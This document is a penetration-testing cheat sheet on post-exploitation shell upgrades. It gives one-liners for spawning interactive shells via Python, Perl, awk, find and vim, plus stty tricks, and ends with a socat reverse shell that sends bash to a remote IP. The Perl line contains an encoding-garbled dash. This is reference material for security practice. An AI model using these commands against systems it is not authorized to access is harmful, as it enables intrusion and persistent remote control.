---
tags:
  - Post-Exploitation
---
Upgrading a shell allows for command history and key bindings

# Guide

1. `cat /etc/shells` to see all the shells on the system
# Walkthrough 

1. [How to Upgrade a Dumb Shell to a Fully Interactive Shell for More Flexibility](https://null-byte.wonderhowto.com/how-to/upgrade-dumb-shell-fully-interactive-shell-for-more-flexibility-0197224/)
2. [Upgrade Simple Shells to Fully Interactive TTYs | 0xffsec Handbook](https://0xffsec.com/handbook/shells/full-tty/)

# Windows

By using the `runas` command, you can temporarily switch to a different user account that has more permissions, such as an administrator or root account. This can give you access to additional commands and resources that may not be available with your current shell.

To upgrade your shell using the `runas` command, simply specify the user account you want to switch to and the command you want to run. For example, you could run `runas /user:administrator cmd` to open a new command prompt window with administrator privileges.

## Linux 
### stty

Press `ctrl-z`

```sh
stty raw -echo && fg
```

```
reset
```
### Python

```
python -c 'import pty; pty.spawn("/bin/bash")'
```
### Perl

```shell-session
perl â€”e 'exec "/bin/sh";'
```

### Lua

The command directly below should be run from a script.

```shell-session
lua: os.execute('/bin/sh')
```

### Ruby

The command directly below should be run from a script.

```shell-session
ruby: exec "/bin/sh"
```
### /bin/sh

This command will execute the shell interpreter specified in the path in interactive mode (`-i`).

```
/bin/sh -i
```

### AWK

```shell-session
awk 'BEGIN {system("/bin/sh")}'
```
### Bash 

#### Notes

Special Bash characters which can return some information regarding the operating system.

|**Special Character**|**Description**|
|---|---|
|`\d`|Date (Mon Feb 6)|
|`\D{%Y-%m-%d}`|Date (YYYY-MM-DD)|
|`\H`|Full hostname|
|`\j`|Number of jobs managed by the shell|
|`\n`|Newline|
|`\r`|Carriage return|
|`\s`|Name of the shell|
|`\t`|Current time 24-hour (HH:MM:SS)|
|`\T`|Current time 12-hour (HH:MM:SS)|
|`\@`|Current time|
|`\u`|Current username|
|`\w`|Full path of the current working directory|

This command will execute the shell interpreter specified in the path in interactive mode (`-i`).

```
/bin/bash -i
```

### Find 

```shell-session
find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
```

```shell-session
find . -exec /bin/sh \; -quit
```

### VIM

```shell-session
vim -c ':!/bin/sh'
```
#### Vim Escape

```shell-session
vim
:set shell=/bin/sh
:shell
```
### SoCat

Listener

```
sudo socat file:`tty`,raw,echo=0 tcp-listen:445
```

Sender

```
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.118.8:445
```